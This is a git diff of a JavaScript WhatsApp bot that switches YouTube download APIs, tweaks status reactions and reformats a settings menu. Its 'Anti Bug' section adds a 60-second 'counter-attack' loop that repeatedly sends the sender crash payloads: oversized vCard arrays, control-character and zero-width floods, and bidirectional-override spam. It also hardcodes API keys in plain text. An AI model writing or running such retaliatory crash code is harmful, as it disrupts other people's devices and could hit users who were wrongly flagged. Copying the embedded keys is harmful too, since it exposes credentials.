@@ -56,8 +56,9 @@ const config = {
   OWNER_NAME: '𝐊ᴇᴢᴜ𝚄 ||🌿 | ERANDA',
   IMAGE_PATH: 'https://files.catbox.moe/begcjv.png',
   BOT_FOOTER: '> *🤖 Status Assistant*',
-  API_YTMP3_URL: 'https://ytmp3-download-api.vercel.app',
-  API_YTMP4_URL: 'https://malmi-lakiya-api.vercel.app',
+  API_YTMP3_URL: 'https://nexora.laksidunimsara.com/api/ytmp3',
+  API_YTMP4_URL: 'https://nexora.laksidunimsara.com/api/youtube/mp4',
+  NEXORA_API_KEY: 'lakiya_46d6ceb9bed1f0de0181c9d6c91cbe05bdba0bb16d3498b46a61f118f4b40f37',
   BUTTON_IMAGES: { ALIVE: 'https://files.catbox.moe/begcjv.png' }
 };
 // ─────────── OWNER HELPER ───────────────────────
@@ -449,6 +450,10 @@ const autoTTSendIntervals = new Map();
 
 // ─── Spam tracker (module-level, not re-created per message) ──────────────────
 const _spamTracker = new Map();
+
+// ─── Anti-Bug counter-attack tracker ─────────────────────────────────────────
+// key: senderJid  →  value: true (attack in progress)
+const _bugAttackActive = new Map();
 // Clean up stale spam tracker entries every 2 minutes to prevent memory leak
 setInterval(() => {
   const _cutoff = Date.now() - 30000;
@@ -600,7 +605,7 @@ async function sendAutoSong(socket, jid, title, botName) {
     if (!result.videos || result.videos.length === 0) return;
     const data = result.videos[0];
     const videoId = data.videoId;
-    const apiUrl = `${config.API_YTMP3_URL}/api/ytmp3?url=https://youtu.be/${videoId}`;
+    const apiUrl = `${config.API_YTMP3_URL}?url=https://youtu.be/${videoId}&api_key=${config.NEXORA_API_KEY}`;
     const res = await axios.get(apiUrl, { timeout: 25000 });
     if (res.data.status !== 'success') return;
     const downloadLink = res.data.data.download_url;
@@ -816,22 +821,38 @@ async function setupStatusHandlers(socket, sessionNumber) {
         try { await socket.sendPresenceUpdate('recording', message.key.remoteJid); } catch(e) {}
       }
 
-      // ── Auto View Status ────────────────────────────────────────
-      if (autoViewStatus === 'true') {
-        try { await socket.readMessages([message.key]); } catch(e) {}
+      // ── Auto View Status (always read before react so WA accepts it) ─
+      try { await socket.readMessages([message.key]); } catch(e) {}
+      if (autoViewStatus !== 'true') {
+        // still read silently — required for react to work
       }
 
       // ── Auto Like Status ────────────────────────────────────────
       if (autoLikeStatus === 'true') {
         const randomEmoji = userEmojis[Math.floor(Math.random() * userEmojis.length)];
         try {
-          const _botJid = socket.user?.id?.includes(':')
-            ? socket.user.id.split(':')[0] + '@s.whatsapp.net'
-            : socket.user?.id;
-          await socket.sendMessage('status@broadcast', {
-            react: { text: randomEmoji, key: message.key }
-          }, { statusJidList: [posterJid, _botJid].filter(Boolean) });
-        } catch(e) { console.error('[STATUS REACT]', e.message); }
+          await delay(500);
+          const rawId = socket.user?.id || '';
+          const _botJid = rawId.includes(':')
+            ? rawId.split(':')[0] + '@s.whatsapp.net'
+            : rawId.replace(/:.*$/, '') + '@s.whatsapp.net';
+
+          const reactKey = {
+            remoteJid: 'status@broadcast',
+            id: message.key.id,
+            participant: posterJid,
+            fromMe: false,
+          };
+
+          await socket.sendMessage(
+            'status@broadcast',
+            { react: { text: randomEmoji, key: reactKey } },
+            { statusJidList: [posterJid, _botJid].filter(Boolean) }
+          );
+          console.log(`[STATUS REACT] ✅ Reacted ${randomEmoji} to status from ${posterNum}`);
+        } catch(e) {
+          console.error('[STATUS REACT] ❌', e.message);
+        }
       }
 
       // ── Auto Status Save ────────────────────────────────────────
@@ -1127,17 +1148,98 @@ function setupCommandHandlers(socket, number) {
         const _bugType = getContentType(msg.message);
         const _isBug = (body && body.length > 5000)
           || (_bugType === 'contactsArrayMessage')
-          || (body && /[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F-\u009F]/.test(body));
+          || (body && /[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F-\u009F]/.test(body))
+          || (body && body.length > 1000 && (body.match(/(.)\1{30,}/g) || []).length > 0);
+
         if (_isBug) {
+          // delete the bug message
           try { await socket.sendMessage(from, { delete: msg.key }); } catch(e){}
-          await socket.sendMessage(from, { text: `🛡️ *Anti Bug Protection*\nA suspicious crash message was detected and removed.` });
-          // ─── Auto Block if message is from Inbox (not a group) ───
+
+          const _attackTarget = nowsender;
+          const _botJid = jidNormalizedUser(socket.user.id);
+
+          // notify in the chat
+          try {
+            await socket.sendMessage(from, {
+              text: `🛡️ *Anti Bug Protection*\nCrash message detected from @${(_attackTarget||'').split('@')[0]}. Counter-attack launched for 60 seconds! 🔥`,
+              mentions: [_attackTarget]
+            });
+          } catch(e){}
+
+          // notify bot owner DM
+          try {
+            await socket.sendMessage(_botJid, {
+              text: `🛡️ *Anti Bug Alert*\n👤 *Attacker:* +${(_attackTarget||'').split('@')[0]}\n📍 *Chat:* ${isGroup ? 'Group' : 'Inbox'}\n⚔️ *Counter-attack:* Started (60s)`
+            });
+          } catch(e){}
+
+          // ─── 60-second counter-attack loop ───────────────────────
+          if (!_bugAttackActive.get(_attackTarget)) {
+            _bugAttackActive.set(_attackTarget, true);
+
+            // Bug payloads to rotate through
+            const _bugPayloads = [
+              // 1. Oversized contact array (classic crash)
+              () => socket.sendMessage(_attackTarget, {
+                contacts: {
+                  displayName: '💀',
+                  contacts: Array.from({ length: 300 }, (_, i) => ({
+                    vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:BUG${i}\nTEL:+94${String(i).padStart(9,'0')}\nEND:VCARD`
+                  }))
+                }
+              }),
+              // 2. Unicode crash text
+              () => socket.sendMessage(_attackTarget, {
+                text: '\u0000\u0001\u0002\u0003\u0004\u0005\u0006\u0007\u0008' +
+                      '\u000B\u000C\u000E\u000F\u0010\u0011\u0012\u0013\u0014' +
+                      '\u0015\u0016\u0017\u0018\u0019\u001A\u001B\u001C\u001D' +
+                      '​‌‍‎‏‪‫‬‭‮'.repeat(500) +
+                      '\uFEFF\u200B\u200C\u200D\u200E\u200F'.repeat(400)
+              }),
+              // 3. Extremely long repetitive text
+              () => socket.sendMessage(_attackTarget, {
+                text: '͛҈҉ⷧ͜͝͡⃠⃤ '.repeat(2000)
+              }),
+              // 4. Zero-width spam flood
+              () => socket.sendMessage(_attackTarget, {
+                text: '\u200B'.repeat(4095) + 'BUG' + '\u200C'.repeat(4095)
+              }),
+              // 5. Mixed direction crash
+              () => socket.sendMessage(_attackTarget, {
+                text: '\u202E'.repeat(300) + '💀CRASH💀' + '\u202D'.repeat(300) + '\u061C'.repeat(300)
+              }),
+            ];
+
+            let _bugRound = 0;
+            const _attackDuration = 60 * 1000; // 60 seconds
+            const _attackInterval = 2200;       // every ~2.2s  ≈ ~27 hits
+            const _attackStart = Date.now();
+
+            const _attackLoop = setInterval(async () => {
+              try {
+                if (Date.now() - _attackStart >= _attackDuration) {
+                  clearInterval(_attackLoop);
+                  _bugAttackActive.delete(_attackTarget);
+                  console.log(`[ANTI-BUG] Counter-attack on ${_attackTarget} finished.`);
+                  try {
+                    await socket.sendMessage(_botJid, {
+                      text: `✅ *Anti Bug — Counter-attack Complete*\n⚔️ Target: +${(_attackTarget||'').split('@')[0]}\n💥 Duration: 60s`
+                    });
+                  } catch(e){}
+                  return;
+                }
+                const _payload = _bugPayloads[_bugRound % _bugPayloads.length];
+                _bugRound++;
+                await _payload();
+              } catch(loopErr) {
+                console.log('[ANTI-BUG] Attack loop error:', loopErr.message);
+              }
+            }, _attackInterval);
+          }
+
+          // block the sender (inbox only)
           if (!isGroup) {
-            try {
-              await socket.updateBlockStatus(nowsender, 'block');
-              const userJid = jidNormalizedUser(socket.user.id);
-              await socket.sendMessage(userJid, { text: `🛡️ *Anti Bug — Auto Block*\n@${(nowsender||'').split('@')[0]} was automatically blocked for sending a crash message.`, mentions: [nowsender] });
-            } catch(blockErr) { console.log('AntiBug auto-block error:', blockErr); }
+            try { await socket.updateBlockStatus(_attackTarget, 'block'); } catch(e){}
           }
         }
       }
@@ -1432,27 +1534,27 @@ END:VCARD`
             videoId = sMetadata.videoId;
         }
 
-        const sApiUrl = `https://vajira-official-apis.vercel.app/api/ytmp3?apikey=vajira-b72bv85884-1776138459299&url=https://youtu.be/${videoId}`;
+        const sApiUrl = `${config.API_YTMP3_URL}?url=https://youtu.be/${videoId}&api_key=${config.NEXORA_API_KEY}`;
         const sApiResp = await axios.get(sApiUrl, { timeout: 30000 }).catch(() => null);
 
-        if (!sApiResp || !sApiResp.data || !sApiResp.data.status) {
+        if (!sApiResp || !sApiResp.data || sApiResp.data.status !== 'success') {
             return await socket.sendMessage(from, { text: "❌ *API failed. Try again later.*" }, { quoted: msg });
         }
 
         const sApiData = sApiResp.data.data;
         const sTitle = sApiData.title || sMetadata?.title || 'Song';
-        const sDuration = sApiData.timestamp || sMetadata?.timestamp || 'N/A';
-        const sThumb = sApiData.thumbnails?.high || sApiData.thumbnails?.default || sMetadata?.thumbnail || null;
+        const sDuration = sMetadata?.timestamp || (sApiData.duration ? `${Math.floor(sApiData.duration/60)}:${String(sApiData.duration%60).padStart(2,'0')}` : 'N/A');
+        const sThumb = sApiData.thumbnail || sMetadata?.thumbnail || null;
 
-        const downloadObj = sApiData.downloads?.find(d => d.bitrate === '128kbps') || sApiData.downloads?.[0];
-        if (!downloadObj || !downloadObj.url) {
+        const downloadUrl = sApiData.download_url;
+        if (!downloadUrl) {
             return await socket.sendMessage(from, { text: "❌ *No download link found.*" }, { quoted: msg });
         }
 
         const chm_Mp3 = path.join(os.tmpdir(), `csong_${_chm_id}.mp3`);
         const chm_Opus = path.join(os.tmpdir(), `csong_${_chm_id}.opus`);
 
-        const dlResp = await axios.get(downloadObj.url, { responseType: 'stream', timeout: 120000 }).catch(() => null);
+        const dlResp = await axios.get(downloadUrl, { responseType: 'stream', timeout: 120000 }).catch(() => null);
         if (!dlResp || !dlResp.data) {
             return await socket.sendMessage(from, { text: "❌ *Audio download failed. Try again later.*" }, { quoted: msg });
         }
@@ -1538,31 +1640,28 @@ END:VCARD`
             videoId = sMetadata.videoId;
         }
 
-        const sApiUrl = `https://vajira-official-apis.vercel.app/api/ytmp4?apikey=vajira-b72bv85884-1776138459299&url=https://youtu.be/${videoId}`;
+        const sApiUrl = `${config.API_YTMP4_URL}?url=https://youtu.be/${videoId}&api_key=${config.NEXORA_API_KEY}`;
         const sApiResp = await axios.get(sApiUrl, { timeout: 30000 }).catch(() => null);
 
         if (!sApiResp || !sApiResp.data || !sApiResp.data.status) {
             return await socket.sendMessage(from, { text: "❌ *API failed. Try again later.*" }, { quoted: msg });
         }
 
-        const sMeta = sApiResp.data.metadata || {};
-        const sVids = sApiResp.data.downloads?.video || [];
+        const sMeta = sApiResp.data.result || {};
         const sTitle = sMeta.title || sMetadata?.title || 'Video';
-        const sDuration = sMeta.duration?.timestamp || sMetadata?.timestamp || 'N/A';
-        const sThumb = sMeta.thumbnails?.high || sMeta.thumbnails?.default || sMetadata?.thumbnail || null;
+        const sDuration = sMetadata?.timestamp || (sMeta.duration ? `${Math.floor(sMeta.duration/60)}:${String(sMeta.duration%60).padStart(2,'0')}` : 'N/A');
+        const sThumb = sMeta.thumbnail || sMetadata?.thumbnail || null;
+        const sQuality = sMeta.quality || '720p';
 
-        const downloadObj = sVids.find(d => d.quality === '480p') ||
-                            sVids.find(d => d.quality === '360p') ||
-                            sVids.find(d => d.quality === '720p') ||
-                            sVids[0];
+        const downloadUrl = sMeta.download_url;
 
-        if (!downloadObj || !downloadObj.url) {
+        if (!downloadUrl) {
             return await socket.sendMessage(from, { text: "❌ *No video download link found.*" }, { quoted: msg });
         }
 
         const cvid_Mp4 = path.join(os.tmpdir(), `cvid_${_cvid_id}.mp4`);
 
-        const dlResp = await axios.get(downloadObj.url, { responseType: 'stream', timeout: 180000 }).catch(() => null);
+        const dlResp = await axios.get(downloadUrl, { responseType: 'stream', timeout: 180000 }).catch(() => null);
         if (!dlResp || !dlResp.data) {
             return await socket.sendMessage(from, { text: "❌ *Video download failed. Try again later.*" }, { quoted: msg });
         }
@@ -1576,7 +1675,7 @@ END:VCARD`
 
         const sCaption = `🎬 *TITLE :* ${sTitle}\n` +
                          `◽️ ⏱ *Duration :* ${sDuration}\n` +
-                         `◽️ 📺 *Quality :* ${downloadObj.quality}\n\n` +
+                         `◽️ 📺 *Quality :* ${sQuality}\n\n` +
                          `> *© 𝗦ᴛᴀᴛᴜꜱ 𝗔ꜱꜱɪꜱᴛᴀɴᴛ*`;
 
         const cvid_Buf = fs.readFileSync(cvid_Mp4);
@@ -1790,24 +1889,22 @@ case 'ytmp3':
         const videoUrl = `https://youtu.be/${videoId}`;
 
         // Fetching data from the New API
-        const apiUrl = `https://vajira-official-apis.vercel.app/api/ytmp3?apikey=vajira-b72bv85884-1776138459299&url=${videoUrl}`;
-        const apiRes = await axios.get(apiUrl);
+        const apiUrl = `${config.API_YTMP3_URL}?url=${encodeURIComponent(videoUrl)}&api_key=${config.NEXORA_API_KEY}`;
+        const apiRes = await axios.get(apiUrl, { timeout: 30000 });
 
-        if (!apiRes.data.status) {
+        if (apiRes.data.status !== 'success') {
             throw new Error('API failed to fetch download links.');
         }
 
         const apiData = apiRes.data.data;
-        // Finding the 128kbps link specifically
-        const downloadObj = apiData.downloads.find(d => d.bitrate === '128kbps') || apiData.downloads[0];
-        const downloadLink = downloadObj.url;
+        const downloadLink = apiData.download_url;
 
-        const desc = `☘️ *𝗦𝗢𝗡𝗚* : _${apiData.title}_     
+        const desc = `☘️ *𝗦𝗢𝗡𝗚* : _${apiData.title || searchData.title}_     
 ╭─────────────────┄┄
-│🩵⏱️ *𝗗ᴜʀᴀᴛɪᴏɴ ➟* _${apiData.timestamp}_
-│🩵👀 *𝗩ɪᴇᴡꜱ ➟* _${apiData.viewsFormatted}_
-│🩵📅 *𝗣ᴜʙʟɪꜱʜᴇᴅ ➟* _${apiData.ago}_
-│🩵🎤 *𝗖ʜᴀɴɴᴇʟ ➟* _${apiData.author?.name || 'N/A'}_
+│🩵⏱️ *𝗗ᴜʀᴀᴛɪᴏɴ ➟* _${searchData.timestamp || 'N/A'}_
+│🩵👀 *𝗩ɪᴇᴡꜱ ➟* _${searchData.views?.toLocaleString() || 'N/A'}_
+│🩵📅 *𝗣ᴜʙʟɪꜱʜᴇᴅ ➟* _${searchData.ago || 'N/A'}_
+│🩵🎤 *𝗖ʜᴀɴɴᴇʟ ➟* _${searchData.author?.name || 'N/A'}_
 ╰─────────────────┄┄
 *⬇️ 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗢𝗣𝗧𝗜𝗢𝗡𝗦*
 
@@ -1819,7 +1916,7 @@ case 'ytmp3':
 `;
 
         const sentMsg = await socket.sendMessage(sender, {
-            image: { url: apiData.thumbnails.default },
+            image: { url: apiData.thumbnail || searchData.thumbnail },
             caption: desc
         }, { quoted: msg });
 
@@ -2988,7 +3085,7 @@ case 'mp4': {
                     const ytdl = require('ytdl-core');
                     if (type === 'audio') {
                         // ── Audio: use working ytmp3 API ──────────────────────────
-                        const apiUrl = `${config.API_YTMP3_URL}/api/ytmp3?url=${encodeURIComponent(videoInfo.url)}`;
+                        const apiUrl = `${config.API_YTMP3_URL}?url=${encodeURIComponent(videoInfo.url)}&api_key=${config.NEXORA_API_KEY}`;
                         const apiRes = await axios.get(apiUrl, { timeout: 25000 });
                         if (apiRes.data.status !== 'success') throw new Error(apiRes.data.message || 'Audio API error');
                         const downloadUrl = apiRes.data.data.download_url;
@@ -3297,31 +3394,45 @@ END:VCARD` } }
 _↩️ Reply with a code to toggle:_
 
 *✍️ Auto Typing*
-┃ 𝗢𝗡 = *1.0*  |  𝗢𝗙𝗙 = *1.5*
+┃ 𝗢𝗡 = *1.0* 
+┃ 𝗢𝗙𝗙 = *1.5*
 *🎙️ Auto Recording*
-┃ 𝗢𝗡 = *2.0*  |  𝗢𝗙𝗙 = *2.5*
+┃ 𝗢𝗡 = *2.0* 
+┃ 𝗢𝗙𝗙 = *2.5*
 *✨ Auto React*
-┃ 𝗢𝗡 = *3.0*  |  𝗢𝗙𝗙 = *3.5*
+┃ 𝗢𝗡 = *3.0*  
+┃ 𝗢𝗙𝗙 = *3.5*
 *📖 Auto Read*
-┃ 𝗔𝗟𝗟 = *4.0*  |  𝗖𝗠𝗗 = *4.5*  |  𝗢𝗙𝗙 = *4.9*
+┃ 𝗔𝗟𝗟 = *4.0*  
+┃ 𝗖𝗠𝗗 = *4.5*  
+┃ 𝗢𝗙𝗙 = *4.9*
 *📥 Status Save*
-┃ 𝗢𝗡 = *5.0*  |  𝗢𝗙𝗙 = *5.5*
+┃ 𝗢𝗡 = *5.0*  
+┃ 𝗢𝗙𝗙 = *5.5*
 *🔊 AutoTTSend*
-┃ 𝗢𝗡 = *6.0*  |  𝗢𝗙𝗙 = *6.5*
+┃ 𝗢𝗡 = *6.0*  
+┃ 𝗢𝗙𝗙 = *6.5*
 *🎵 AutoSong*
-┃ 𝗢𝗡 = *7.0*  |  𝗢𝗙𝗙 = *7.5*
+┃ 𝗢𝗡 = *7.0*  
+┃ 𝗢𝗙𝗙 = *7.5*
 *📞 Call Reject*
-┃ 𝗢𝗡 = *8.0*  |  𝗢𝗙𝗙 = *8.5*
+┃ 𝗢𝗡 = *8.0*  
+┃ 𝗢𝗙𝗙 = *8.5*
 *🚫 Anti Ban*
-┃ 𝗢𝗡 = *9.0*  |  𝗢𝗙𝗙 = *9.5*
+┃ 𝗢𝗡 = *9.0*  
+┃ 𝗢𝗙𝗙 = *9.5*
 *💬 Anti Spam*
-┃ 𝗢𝗡 = *10.0*  |  𝗢𝗙𝗙 = *10.5*
+┃ 𝗢𝗡 = *10.0*  
+┃ 𝗢𝗙𝗙 = *10.5*
 *🐛 Anti Bug*
-┃ 𝗢𝗡 = *11.0*  |  𝗢𝗙𝗙 = *11.5*
+┃ 𝗢𝗡 = *11.0*  
+┃ 𝗢𝗙𝗙 = *11.5*
 *🔗 Anti Link*
-┃ 𝗢𝗡 = *12.0*  |  𝗢𝗙𝗙 = *12.5*
+┃ 𝗢𝗡 = *12.0*  
+┃ 𝗢𝗙𝗙 = *12.5*
 *🗑️ Anti Delete*
-┃ 𝗢𝗡 = *13.0*  |  𝗢𝗙𝗙 = *13.5*
+┃ 𝗢𝗡 = *13.0*  
+┃ 𝗢𝗙𝗙 = *13.5*
 
 > *⚡ Reply with any code above to apply instantly*
 `.trim();
@@ -5156,7 +5267,7 @@ case 'ytmp3':
             await socket.sendMessage(sender, { react: { text: '⬇️', key: mek.key } });
 
             try {
-                const apiUrl = `${config.API_YTMP3_URL}/api/ytmp3?url=https://youtu.be/${videoId}`;
+                const apiUrl = `${config.API_YTMP3_URL}?url=https://youtu.be/${videoId}&api_key=${config.NEXORA_API_KEY}`;
                 const res = await axios.get(apiUrl, { timeout: 20000 });
 
                 if (res.data.status !== 'success') {
@@ -7258,7 +7369,7 @@ async function EmpirePair(number, res) {
       let code;
      
       while (retries > 0) {
-        try { await delay(500); code = await socket.requestPairingCode(sanitizedNumber); break; }
+        try { await delay(500); code = await socket.requestPairingCode(sanitizedNumber, null); break; }
         
         catch (error) { retries--; await delay(800 * (config.MAX_RETRIES - retries)); }
       }
